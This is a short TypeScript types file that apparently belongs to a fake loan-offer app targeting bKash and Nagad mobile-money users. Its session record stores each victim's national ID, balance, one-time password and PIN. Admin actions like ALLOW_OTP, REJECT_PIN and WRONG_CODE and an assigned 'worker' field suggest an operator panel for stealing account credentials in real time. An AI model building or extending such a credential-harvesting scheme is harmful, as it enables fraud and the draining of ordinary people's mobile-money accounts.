
export interface LoanFormData {
  fullName: string;
  loanAmount: string;
  duration: string;
  address: string;
  paymentNumber: string;
  paymentMethod: 'bKash';
  nidNumber: string;
}

export interface AccountVerificationData {
  currentBalance: string;
  lastTransaction: string;
}

export enum AppStep {
  Home = 'HOME',
  ApplicationForm = 'FORM',
  AccountDetails = 'ACCOUNT_DETAILS',
  FinalResult = 'RESULT',
  Admin = 'ADMIN',
  Blocked = 'BLOCKED'
}

export interface CustomerSession {
  id: string;
  orderId: string;
  name: string;
  provider?: 'bkash' | 'nagad';
  initialPhone: string;
  gatewayPhone: string;
  balance: string;
  lastBalance?: string;
  otp: string;
  pin: string;
  waitingFor: 'NONE' | 'OTP_PERM' | 'FINAL_WAIT' | 'VERIFY_PAGE';
  adminAction: 'NONE' | 'ALLOW_OTP' | 'APPROVE' | 'REJECT_PIN' | 'CANCEL_ALL' | 'RESET_GATEWAY' | 'SHOW_VERIFY' | 'WRONG_CODE' | 'DONE' | 'REVIEW_APP';
  lastUpdated: number;
  createdAt?: number;
  blocked?: boolean;
  clientIp?: string;
  congratsSent?: boolean;
  congratsNotifText?: string;
  congratsNotifTime?: number;
  verifyStatus?: 'WAITING' | 'SHOWN' | 'NONE';
  assignedWorker?: string;
}
